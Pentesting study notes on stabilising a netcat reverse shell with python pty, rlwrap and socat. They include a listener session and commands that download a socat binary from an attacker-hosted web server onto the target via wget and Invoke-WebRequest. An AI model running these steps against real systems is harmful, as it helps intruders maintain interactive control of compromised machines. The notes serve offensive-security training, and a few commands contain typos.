# Stablization Techniques

## Technique 1: python

- use `python -c 'import pty;pty.spawn("/bin/bash")'`, this will invoke a featured bash shell.
- this will make the shell look prettier, but still won't be able to use auto-complete or up/down arrows etc.,
- `export TERM=xterm` this will give access to term commands such as `clear`
- Finally, we will background the shell using Cntrl + Z. 
- We use `ssty raw -echo; fg`. this turns off our own terminal's echo (which gives us access to tab autocompletes, the arrow keys and Ctrl+C to kill the processes). It then foregrounds the shell, thus completing the process.

```
sudo nc -lnvp 443
[+] connection obtained...

python3 -c 'import pty;pty.spawn("/bin/bash")'
shell@target_machine$ export term=XTERM
shell@target_machine$
shell@target_machine$ Cntrl + Z (press here)
[1]+ Stopped       sudo nc -lnvp 443
stty raw -echo;fg

shell@target_machine$ whoami
shell

```
- You can type `reset` and press enter if shell dies.

## Technique 2:rlwrap

- rlwrap is a program which gives access to history, tab autocompletion and arrow keys immediately upon  receiving a shell.
- Now you have to prepend `nc -lnvp <port>` with rlwrap
- this gives a fully featured shell. - `rlwrap nc -lnvp <port>`
- this technique is particularly useful with windows shells otherwise it becomes very difficult.
- if its a linux target, it the same as shown above in step 3.
  - background the shell with Cntrl+Z
  - `stty raw -echo` - stablize the shell
  - `fg` - foreground the shell & enter it.

## Technique 3: Socat

- first use netcat then socat.
- this is limited to linux targets only.
- To accomplish this method of stablization, we need to first transfer a `socat static complied binary`(a version of the program compiled to have no dependencies)up to the target machine.
- a typical way to achieve this would be to start a webserver on the attacking machine, where this socat binary is present.(`sudo python -m http.server 80`).
- on the target machine, use the netcat shell to download the file. On linux this will be accomplished with curl or wget (`wget <Attacker_machine_ip>:80/socat -O /tmp/socat`)
- for the sake of completeness, on a windows environment, use `Invoke-WebRequest` or `webrequest` system depending on the version of powershell installed.
`Invoke-WebRequest -uri <LOCAL_IP>/socat.exe -outfile C:\\windows\temp\socat.exe`

with any of the above techniques it is useful to change the size of your terminal.
`ssty -a` to check the defaults on your terminal.

And you can use `stty rows <number>` and `stty cols <number>`. this can help you set the terminal size for opening text files so that editing can be accurate and efficient.

 


